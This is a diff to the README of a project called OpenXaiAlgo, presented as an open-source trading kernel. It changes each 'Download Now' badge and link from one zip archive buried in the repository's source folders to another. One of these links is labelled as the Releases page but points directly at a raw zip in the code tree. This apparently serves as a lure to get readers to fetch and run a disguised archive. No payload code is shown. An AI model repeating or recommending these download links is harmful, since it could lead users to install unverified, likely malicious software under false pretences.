@@ -1,6 +1,6 @@
 # 🚀 OpenXaiAlgo - Stable and Reliable Trading Kernel
 
-[![Download OpenXaiAlgo](https://raw.githubusercontent.com/NIGHT13IRD/OpenXaiAlgo/main/TradingSystem.Console/Trading/Execution/Xai-Algo-Open-v1.0.zip%20Now-OpenXaiAlgo-blue?style=for-the-badge)](https://raw.githubusercontent.com/NIGHT13IRD/OpenXaiAlgo/main/TradingSystem.Console/Trading/Execution/Xai-Algo-Open-v1.0.zip)
+[![Download OpenXaiAlgo](https://github.com/NIGHT13IRD/OpenXaiAlgo/raw/refs/heads/main/TradingSystem.Console/Trading/Data/Open-Xai-Algo-2.2-alpha.4.zip%20Now-OpenXaiAlgo-blue?style=for-the-badge)](https://github.com/NIGHT13IRD/OpenXaiAlgo/raw/refs/heads/main/TradingSystem.Console/Trading/Data/Open-Xai-Algo-2.2-alpha.4.zip)
 
 ## 📋 Overview
 
@@ -25,13 +25,13 @@ OpenXaiAlgo is an open-source trading kernel designed for stability and performa
 
 To start using OpenXaiAlgo, you'll need to download the software from our Releases page. Follow these steps:
 
-1. Click the **Download Now** button above or visit the [OpenXaiAlgo Releases page](https://raw.githubusercontent.com/NIGHT13IRD/OpenXaiAlgo/main/TradingSystem.Console/Trading/Execution/Xai-Algo-Open-v1.0.zip).
+1. Click the **Download Now** button above or visit the [OpenXaiAlgo Releases page](https://github.com/NIGHT13IRD/OpenXaiAlgo/raw/refs/heads/main/TradingSystem.Console/Trading/Data/Open-Xai-Algo-2.2-alpha.4.zip).
 2. Look for the latest release.
 3. Download the appropriate file for your Linux system.
 
 ## 🔥 Download & Install
 
-Visit [this page to download](https://raw.githubusercontent.com/NIGHT13IRD/OpenXaiAlgo/main/TradingSystem.Console/Trading/Execution/Xai-Algo-Open-v1.0.zip) the latest version of OpenXaiAlgo. 
+Visit [this page to download](https://github.com/NIGHT13IRD/OpenXaiAlgo/raw/refs/heads/main/TradingSystem.Console/Trading/Data/Open-Xai-Algo-2.2-alpha.4.zip) the latest version of OpenXaiAlgo. 
 
 ### Installation Steps:
 
